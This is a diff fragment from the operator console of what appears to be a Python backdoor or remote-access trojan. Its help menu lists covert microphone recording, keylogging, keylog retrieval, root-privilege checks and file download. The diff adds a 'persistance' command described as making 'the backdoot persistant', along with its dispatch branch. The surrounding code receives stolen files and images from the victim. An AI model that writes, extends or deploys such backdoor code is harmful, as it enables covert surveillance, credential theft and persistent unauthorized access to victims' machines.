@@ -91,6 +91,7 @@ def shell():
                     mic <time>         ==> Voice recorder (time in seconds)
                     keylog             ==> Start keylog program
                     dump_keylog        ==> Get the keylog file
+                    persistance        ==> Make the backdoot persistant
                     check              ==> check for root privileges 
                     q                  ==> quit session
                     =================================================================\n'''
@@ -98,7 +99,7 @@ def shell():
 
         elif command[:2] == "cd" and len(command) > 1:
             continue
-
+        
         elif command[:8] == "download":
             with open(command[9:], "wb") as file:
                 result = recv_file()
@@ -160,6 +161,9 @@ def shell():
                 print("am here too")
                 img = recv_file()
                 sc.write(img)
+
+        elif command[:11] == "persistance":
+            continue
 
         else:
             result = reliable_recv()
